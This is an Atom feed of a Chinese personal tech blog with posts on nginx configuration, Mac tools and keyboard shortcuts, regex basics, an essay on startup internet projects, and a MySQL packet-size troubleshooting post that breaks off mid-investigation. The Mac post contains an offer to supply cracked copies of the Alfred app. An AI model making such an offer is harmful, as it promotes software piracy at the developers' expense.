<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>码工严彬 coding不仅仅是工作</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://binyanbin.github.io/"/>
  <updated>2016-09-09T17:14:10.000Z</updated>
  <id>http://binyanbin.github.io/</id>
  
  <author>
    <name>严彬</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>nginx 速记1</title>
    <link href="http://binyanbin.github.io/2016/09/10/nginx-1/"/>
    <id>http://binyanbin.github.io/2016/09/10/nginx-1/</id>
    <published>2016-09-09T16:00:00.000Z</published>
    <updated>2016-09-09T17:14:10.000Z</updated>
    
    <content type="html">&lt;p&gt;示例:&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;http &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	log_format upstream_time &amp;apos;$remote_addr - $remote_user [$time_local] &amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                             &amp;apos;&amp;quot;$request&amp;quot; $status $body_bytes_sent &amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                             &amp;apos;&amp;quot;$http_referer&amp;quot; &amp;quot;$http_user_agent&amp;quot;&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                             &amp;apos;rt=$request_time uct=&amp;quot;$upstream_connect_time&amp;quot; uht=&amp;quot;$upstream_header_time&amp;quot; urt=&amp;quot;$upstream_response_time&amp;quot;&amp;apos;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    server &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    	access_log /spool/logs/nginx-access.log upstream_time;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    	error_log logs/error.log warn;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		listen 80 backlog 4096;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		server_name example.org www.example.org;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		location /images/ &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        	root /data;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        	index index.html;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        	sendfile   on;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    		tcp_nopush on;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    	location ~ \.php &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    		proxy_set_header Host $host;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    		proxy_set_header X-Real-IP $remote_addr;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    		proxy_set_header Accept-Encoding &amp;quot;&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    		proxy_buffers 16 4k;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    		proxy_buffer_size 2k;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		    proxy_pass http://localhost:8000;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&quot;web服务器&quot;&gt;&lt;a href=&quot;#web服务器&quot; class=&quot;headerlink&quot; title=&quot;web服务器&quot;&gt;&lt;/a&gt;web服务器&lt;/h2&gt;&lt;p&gt;http 服务&lt;br&gt;server 虚拟机&lt;br&gt;location 路径&lt;br&gt;listen 监听端口 backlog 堆大小&lt;/p&gt;
&lt;h2 id=&quot;静态资源&quot;&gt;&lt;a href=&quot;#静态资源&quot; class=&quot;headerlink&quot; title=&quot;静态资源&quot;&gt;&lt;/a&gt;静态资源&lt;/h2&gt;&lt;p&gt;location 路径(正则表达式):&lt;br&gt;root 目录&lt;br&gt;index  默认页面&lt;/p&gt;
&lt;p&gt;上传文件设置:&lt;br&gt;sendfile           on;&lt;br&gt;sendfile_max_chunk 1m;&lt;/p&gt;
&lt;h2 id=&quot;代理&quot;&gt;&lt;a href=&quot;#代理&quot; class=&quot;headerlink&quot; title=&quot;代理&quot;&gt;&lt;/a&gt;代理&lt;/h2&gt;&lt;p&gt;针对路径&lt;br&gt;proxy_pass 转发地址&lt;br&gt;proxy_set_header 设置头信息&lt;br&gt;Ｈost 域名&lt;br&gt;X-Real-IP 客户端地址&lt;br&gt;proxy_buffers off/on&lt;br&gt;proxy_buffers 缓存&lt;br&gt;proxy_buffer_size 缓存大小&lt;/p&gt;
&lt;h2 id=&quot;日志&quot;&gt;&lt;a href=&quot;#日志&quot; class=&quot;headerlink&quot; title=&quot;日志&quot;&gt;&lt;/a&gt;日志&lt;/h2&gt;&lt;p&gt;针对主机&lt;br&gt;error_log&lt;br&gt;log_format 访问日志格式内容定义&lt;br&gt;access_log&lt;/p&gt;
&lt;p&gt;查看监听:&lt;br&gt;netstat -Lan&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;示例:&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>我的mac精华浓缩版</title>
    <link href="http://binyanbin.github.io/2016/09/04/shortcut/"/>
    <id>http://binyanbin.github.io/2016/09/04/shortcut/</id>
    <published>2016-09-03T16:00:00.000Z</published>
    <updated>2016-09-25T16:23:46.000Z</updated>
    
    <content type="html">&lt;h2 id=&quot;mac下的效率神器&quot;&gt;&lt;a href=&quot;#mac下的效率神器&quot; class=&quot;headerlink&quot; title=&quot;mac下的效率神器&quot;&gt;&lt;/a&gt;mac下的效率神器&lt;/h2&gt;&lt;p&gt;1.Alfred  效率神器，脚本之王，谁用谁知道。要破解版的直接找我:)。&lt;br&gt;2.iTerm  terminal分屏神器，当然不仅仅是分屏&lt;br&gt;3.CatchMouse  多屏显示器必备，最多可以支持四台显示器随意切换屏幕和光标。&lt;/p&gt;
&lt;h2 id=&quot;跨平台工具&quot;&gt;&lt;a href=&quot;#跨平台工具&quot; class=&quot;headerlink&quot; title=&quot;跨平台工具&quot;&gt;&lt;/a&gt;跨平台工具&lt;/h2&gt;&lt;p&gt;1.Eclipse&lt;br&gt;2.Workbench  mysql客户端必备&lt;br&gt;3.Sublime Text&lt;br&gt;4.leanote 笔记本+blog,支持markdown,思维导图，最重要的是免费&lt;br&gt;5.Evernode 印像笔记本&lt;br&gt;6.Chrome&lt;br&gt;7.Postman  webapi测试专用&lt;br&gt;8.AxaTools  小工具集合，各种转换计算和正则测试。&lt;br&gt;9.atash UML作图专用&lt;br&gt;10.Jmeter  性能测试&lt;br&gt;11.Xccello 个人/团队任务管理&lt;/p&gt;
&lt;h2 id=&quot;开启mac-移动硬盘ntfs格式的读写功能&quot;&gt;&lt;a href=&quot;#开启mac-移动硬盘ntfs格式的读写功能&quot; class=&quot;headerlink&quot; title=&quot;开启mac 移动硬盘ntfs格式的读写功能&quot;&gt;&lt;/a&gt;开启mac 移动硬盘ntfs格式的读写功能&lt;/h2&gt;&lt;p&gt;虽说exFAT 可以跨操作系统使用，但总感觉不如ntfs&lt;br&gt;如何开启:&lt;br&gt;在创建一个文件  sudo vim /etc/fstab&lt;br&gt;输入 LABEL=valume none ntfs rw,auto,nobrowse&lt;br&gt;第一列:LABEL=valume 表示移动硬盘的卷名&lt;br&gt;第二列:加入文件系统的位置&lt;br&gt;第三列:文件格式&lt;br&gt;第四列:文件系统状态 rw表示可读写&lt;br&gt;第五列:好像是是否备份的意思。&lt;br&gt;第六列:是否在finder中显示，nobrowse不显示。&lt;br&gt;如何使用:&lt;br&gt;保存fstab文件之后重启mac,在finder下 cmd+shift+g，输入/Volumes/valume进入(valume为你的移动硬盘卷名)&lt;/p&gt;
&lt;h2 id=&quot;快捷键&quot;&gt;&lt;a href=&quot;#快捷键&quot; class=&quot;headerlink&quot; title=&quot;快捷键&quot;&gt;&lt;/a&gt;快捷键&lt;/h2&gt;&lt;p&gt;1.mac基础:&lt;br&gt;ctrl+上下左右   切屏&lt;br&gt;cmd+上下左右  定位&lt;br&gt;cmd+shift+上下左右  定位+选择&lt;br&gt;fn+上下左右  滚动&lt;br&gt;ctrl+cmd+f  全屏&lt;br&gt;cmd+w 关闭当前窗口&lt;br&gt;cmd+q 退出应用程序&lt;/p&gt;
&lt;p&gt;2.chrome(你不可能不用的)&lt;br&gt;cmd+l 地址栏&lt;br&gt;cmd+option+左右 切页面&lt;br&gt;ctrl+tab 切页面&lt;br&gt;cmd+t 新页面&lt;br&gt;cmd+w 关闭页面&lt;br&gt;cmd+shift+w 关闭窗口&lt;br&gt;cmd+option+i 开发者工具&lt;/p&gt;
&lt;p&gt;3.vim(用linux服务器你无法绕过它)&lt;br&gt;:set number 显示行号&lt;br&gt;:syntax on 语法显示&lt;br&gt;:%d 删除全部内容&lt;br&gt;w下一个单词&lt;br&gt;b上一个单词&lt;br&gt;gg文件首&lt;br&gt;Ｇ文件尾&lt;br&gt;0行首&lt;br&gt;^行首文字&lt;br&gt;$行尾&lt;br&gt;dd删除当前行&lt;br&gt;3x 删除后3个字符 3X 删除前3个个字符&lt;br&gt;11G 调到第11行&lt;br&gt;Ctrl+f Ctrl+b 翻页&lt;br&gt;/word 查找 n 查找下一个&lt;br&gt;u  ctrl+r   撤销 重做&lt;/p&gt;
&lt;p&gt;4.bash&lt;br&gt;ctrl+a 开头&lt;br&gt;ctrl+e 结毛&lt;br&gt;ctrl+k 清除光标后至行尾&lt;br&gt;ctrl+u清除光标至之前&lt;br&gt;tab 补全&lt;br&gt;ctrl+c 终止&lt;/p&gt;
&lt;p&gt;5.sublime&lt;br&gt;ctrl+k+b 目录显示/隐藏&lt;br&gt;cmd+option+number 分屏&lt;br&gt;ctrl+shift+number 移屏&lt;br&gt;cmd+option+左右 切文件&lt;br&gt;ctrl+tab 切文件&lt;br&gt;cmd+n 创建新文件&lt;br&gt;cmd+p 查找文件&lt;br&gt;cmd+shift+p  插件命令&lt;br&gt;cmd+alt+g 快找&lt;br&gt;cmd+f 查找 alt+cmd+r 正则&lt;br&gt;cmd+shift+f 替换&lt;br&gt;cmd+k+u 大写 cmd+k+l 小写&lt;br&gt;cmd+k+num 折到第几层&lt;br&gt;cmd+k+j 全部展开&lt;br&gt;cmd+k+k 删除到行末尾&lt;br&gt;cmd+w 关闭文件&lt;br&gt;cmd+shift+w 关闭窗口&lt;br&gt;ctrl+shift+k 删除行&lt;br&gt;F6 拼写检查&lt;/p&gt;
&lt;p&gt;6.eclispe (java开发必备)&lt;br&gt;cmd+e 已打开文件&lt;br&gt;cmd+o 文件导航&lt;br&gt;cmd+alt+s 生成&lt;br&gt;cmd+f7 切换窗体&lt;br&gt;f3 转定义&lt;br&gt;cmd+shift+g 转引用&lt;br&gt;cmd+shift+r 打开文件&lt;br&gt;cmd+shift+h 打开类型&lt;br&gt;ctrl+h 综合查找&lt;br&gt;cmd+alt+r 重命名&lt;br&gt;cmd+1 快速修复&lt;br&gt;ctrl+q 回到最后一次编辑的地方&lt;br&gt;alt+/  内容提示&lt;br&gt;cmd+/ 注释&lt;br&gt;cmd+t 查看继承关系&lt;br&gt;cmd+shift+f 格式化&lt;br&gt;cmd+alt+j 添加完整注释&lt;br&gt;ctrl+m 隐藏package&lt;br&gt;cmd+shift+[ 分坚屏&lt;/p&gt;
&lt;h2 id=&quot;附赠hexo-blog发布脚本&quot;&gt;&lt;a href=&quot;#附赠hexo-blog发布脚本&quot; class=&quot;headerlink&quot; title=&quot;附赠hexo blog发布脚本&quot;&gt;&lt;/a&gt;附赠hexo blog发布脚本&lt;/h2&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#!/bin/bash&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;cd&lt;/span&gt; ~/Documents/git/blog&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;hexo clean&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;hexo g&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;cp -r ~/Documents/git/blog/public/ ~/Documents/git/binyanbin.github.io/&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;cd&lt;/span&gt; ~/Documents/git/binaynbin.github.io/&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git commit &lt;span class=&quot;_&quot;&gt;-a&lt;/span&gt; -m &lt;span class=&quot;string&quot;&gt;&#39;submit&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git push&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;持续补充中……&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;mac下的效率神器&quot;&gt;&lt;a href=&quot;#mac下的效率神器&quot; class=&quot;headerlink&quot; title=&quot;mac下的效率神器&quot;&gt;&lt;/a&gt;mac下的效率神器&lt;/h2&gt;&lt;p&gt;1.Alfred  效率神器，脚本之王，谁用谁知道。要破解版的直接找我:)。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>正则速记</title>
    <link href="http://binyanbin.github.io/2016/08/18/regex/"/>
    <id>http://binyanbin.github.io/2016/08/18/regex/</id>
    <published>2016-08-17T16:00:00.000Z</published>
    <updated>2016-09-11T15:42:13.000Z</updated>
    
    <content type="html">&lt;h2 id=&quot;元字符&quot;&gt;&lt;a href=&quot;#元字符&quot; class=&quot;headerlink&quot; title=&quot;元字符&quot;&gt;&lt;/a&gt;元字符&lt;/h2&gt;&lt;p&gt;.   :匹配任意字符&lt;br&gt;\   :转义&lt;br&gt;^  :行开始位置&lt;br&gt;$  :行结束位置&lt;/p&gt;
&lt;h2 id=&quot;范围&quot;&gt;&lt;a href=&quot;#范围&quot; class=&quot;headerlink&quot; title=&quot;范围&quot;&gt;&lt;/a&gt;范围&lt;/h2&gt;&lt;p&gt;[  ]:&lt;br&gt;[0-9],[a-z] : 字符范围&lt;br&gt;^ : 取反   [^a]&lt;/p&gt;
&lt;h2 id=&quot;重复&quot;&gt;&lt;a href=&quot;#重复&quot; class=&quot;headerlink&quot; title=&quot;重复&quot;&gt;&lt;/a&gt;重复&lt;/h2&gt;&lt;p&gt;{ }:&lt;br&gt;a{3}   3次&lt;br&gt;a{3,5} 3到5次&lt;br&gt;?等于{0,1}&lt;br&gt;*等于{0,}&lt;br&gt;+等于{1,}&lt;/p&gt;
&lt;h2 id=&quot;分组与选择&quot;&gt;&lt;a href=&quot;#分组与选择&quot; class=&quot;headerlink&quot; title=&quot;分组与选择&quot;&gt;&lt;/a&gt;分组与选择&lt;/h2&gt;&lt;p&gt;|:&lt;br&gt;cat|dog, [cat|dog]&lt;br&gt;(cat|dog)&lt;/p&gt;
&lt;h2 id=&quot;常用集合&quot;&gt;&lt;a href=&quot;#常用集合&quot; class=&quot;headerlink&quot; title=&quot;常用集合:&quot;&gt;&lt;/a&gt;常用集合:&lt;/h2&gt;&lt;p&gt;\w = [0-9A-Za-z]&lt;br&gt;\W = [^0-9A-Za-z]&lt;br&gt;\s  空格, 制表符,回车或换行符&lt;br&gt;\d   数值&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;元字符&quot;&gt;&lt;a href=&quot;#元字符&quot; class=&quot;headerlink&quot; title=&quot;元字符&quot;&gt;&lt;/a&gt;元字符&lt;/h2&gt;&lt;p&gt;.   :匹配任意字符&lt;br&gt;\   :转义&lt;br&gt;^  :行开始位置&lt;br&gt;$  :行结束位置&lt;/p&gt;
&lt;h2 id=&quot;范围&quot;&gt;&lt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>你确定真的要做互联网项目吗</title>
    <link href="http://binyanbin.github.io/2016/07/01/idea-1/"/>
    <id>http://binyanbin.github.io/2016/07/01/idea-1/</id>
    <published>2016-06-30T16:00:00.000Z</published>
    <updated>2016-07-04T13:59:05.000Z</updated>
    
    <content type="html">&lt;p&gt;最近又有人在群里高价求人(技术合伙人)，待遇2-3W，可以给股份，要求一个月把基本功能全部弄出来。我就开始遐想他们的开搞的过程都是:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;老板或公司有自己觉得很好的idea和一点点钱，并且有一点相关的业务资源，想做一个互联网项目，快速出原型去吸引客户或去融资做大。&lt;/li&gt;
&lt;li&gt;然后招来一个认为技术比较牛B的开发和几个程序员&lt;/li&gt;
&lt;li&gt;公司和老板急不可待的要快点上线&lt;/li&gt;
&lt;li&gt;大牛说就你这么一个复杂玩意，我怎么在这么短的时间完成了。&lt;/li&gt;
&lt;li&gt;大家决定买套系统或者外包吧-,老板无耐的想想，我又没有更多钱和时间去折腾，找个皮包公司或者买套系统算了。&lt;/li&gt;
&lt;li&gt;折腾一个月终于成了,急不可待上线。&lt;/li&gt;
&lt;li&gt;销售说这玩意请问能符合我们哪点需求?客户那边也不同意。&lt;/li&gt;
&lt;li&gt;然后开始改需求，码农开始填坑&lt;/li&gt;
&lt;li&gt;填坑不断，问题不断，大家开始撕逼， 老板说这么几个模板和功能，你们都改不好？技术团队说你们需求确定了吗?然后产品经理出现，然后长期拉踞战公司内部开始,一直撕逼中……….公司陷入一个互坑的节奏，关门已经不远。&lt;br&gt;但最终坑都是程序员挖的，正如下图描述一下:&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&quot;http://binyanbin.github.io/img/other-1.png&quot; alt=&quot;图&quot;&gt;&lt;/p&gt;
&lt;p&gt;所以锅也肯定也是程序员背。&lt;/p&gt;
&lt;p&gt;通常有这么一种情况也许成功过，一大堆数据需要录入系统，或者几个G的数据需要换个平台，这是老板以前业务的系统的数据，现在需要找一个更合适自己的系统平台，并准备把它互联网化，然后，找来一帮人，去开发实现这个系统，刚开地这帮人也想找现有系统，但就是他玛的没有合适系统，只好硬着头皮去搞，大家坚持了几年，最后还真他玛的搞成了.&lt;br&gt;一开始就天马行空的设计产品，然后再根据产品去做数据，搞销售，搞运营，这种方式往往失率高。&lt;br&gt;就像很多公司搞o2o,电商，一开始就纠结商业模式，系统，平台，功能。你用户都没有，这些东西都没什么卵用。&lt;br&gt;有人一个qq空间做产品展示，用qq加几百个传统渠道商，qq订货，线下打款，最多开一个淘宝店。业务做得飞起来，一天忙不停。&lt;br&gt;也有人在家或公司附近做主动加周围人的微信做产品宣传，用微信朋友圈做产品展示，微信订货，自己送货，线下付款或微信付款都可以，同样也是忙个不停。&lt;br&gt;电商和o2o有很多简单玩法，不一定需要一个什么网站或app出来去支持它，用最原始的方式就能完成交易，如果你想做网站或app，你的目的应该是要收集数据，收集数据就没必要纠结于细节，只要能帮你收集数，这个东西就是有价值的。&lt;/p&gt;
&lt;p&gt;如果要做互联网项目，那就需要做数量级，没有数量级算什么互联网项目。最开始的考虑就应该从获取数据入手。如果你要想快速盈利，你就不应该选择互联网项目，你应该去做IT项目外包。&lt;/p&gt;
&lt;p&gt;所以你确定你真需要做互联网项目吗？你真的合适做互联网项目吗？&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;最近又有人在群里高价求人(技术合伙人)，待遇2-3W，可以给股份，要求一个月把基本功能全部弄出来。我就开始遐想他们的开搞的过程都是:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;老板或公司有自己觉得很好的idea和一点点钱，并且有一点相关的业务资源，想做一个互联网项目，快速出原型去吸引客户或
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>mysql出现Packets larger than max_allowed_packet are not allowed时所发现的问题</title>
    <link href="http://binyanbin.github.io/2016/06/23/hishop-4/"/>
    <id>http://binyanbin.github.io/2016/06/23/hishop-4/</id>
    <published>2016-06-22T16:00:00.000Z</published>
    <updated>2016-06-25T16:44:48.000Z</updated>
    
    <content type="html">&lt;h2 id=&quot;情况&quot;&gt;&lt;a href=&quot;#情况&quot; class=&quot;headerlink&quot; title=&quot;情况&quot;&gt;&lt;/a&gt;情况&lt;/h2&gt;&lt;p&gt;最近公司网站出现所有页面无法访问数据库的问题，但是mysql第三方客户端又可以访问如workbench,但是重启mysql服务之后，网站又恢复正常。&lt;br&gt;查找错误日志,以下为错误堆栈信息:&lt;br&gt;&lt;figure class=&quot;highlight csharp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;MySql.Data.MySqlClient.MySqlException (&lt;span class=&quot;number&quot;&gt;0x80004005&lt;/span&gt;): Packets larger than max_allowed_packet are not allowed.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;在 MySql.Data.MySqlClient.MySqlStream.SendPacket(MySqlPacket packet)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;在 MySql.Data.MySqlClient.NativeDriver.ExecutePacket(MySqlPacket packetToExecute)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;在 MySql.Data.MySqlClient.NativeDriver.SendQuery(MySqlPacket queryPacket)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;在 MySql.Data.MySqlClient.Driver.SendQuery(MySqlPacket p)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;在 MySql.Data.MySqlClient.Statement.ExecuteNext()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;在 MySql.Data.MySqlClient.MySqlCommand.ExecuteReader(CommandBehavior behavior)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;在 MySql.Data.Entity.EFMySqlCommand.ExecuteDbDataReader(CommandBehavior behavior)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;在 System.Data.Entity.Infrastructure.Interception.InternalDispatcher`&lt;span class=&quot;number&quot;&gt;1.&lt;/span&gt;Dispatch[TTarget,TInterceptionContext,TResult](TTarget target, Func`&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt; operation, TInterceptionContext interceptionContext, Action`&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt; executing, Action`&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt; executed)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;在 System.Data.Entity.Infrastructure.Interception.DbCommandDispatcher.Reader(DbCommand command, DbCommandInterceptionContext interceptionContext)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;在 System.Data.Entity.Core.EntityClient.Internal.EntityCommandDefinition.ExecuteStoreCommands(EntityCommand entityCommand, CommandBehavior behavior)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;问题原因是:Packets larger than max_allowed_packet are not allowed.&lt;br&gt;查看官网解释:&lt;br&gt;When a MySQL client or the mysqld server receives a packet bigger than max_allowed_packet bytes, it issues an ER_NET_PACKET_TOO_LARGE error and closes the connection. With some clients, you may also get a Lost connection to MySQL server during query error if the communication packet is too large.&lt;br&gt;Both the client and the server have their own max_allowed_packet variable, so if you want to handle big packets, you must increase this variable both in the client and in the server.&lt;br&gt;按官文文档的解释是你的sql命令太长。&lt;/p&gt;
&lt;h2 id=&quot;排查问题&quot;&gt;&lt;a href=&quot;#排查问题&quot; class=&quot;headerlink&quot; title=&quot;排查问题&quot;&gt;&lt;/a&gt;排查问题&lt;/h2&gt;&lt;p&gt;随即把mysql max_allowed_packet调到20M仍无法解决，网站依就无法访问数据库，仍然出现相同的错误。苦思无果之后，只有从.net mysqlclient源码查起。&lt;br&gt;出错源码为MysqlSteam.cs&lt;/p&gt;
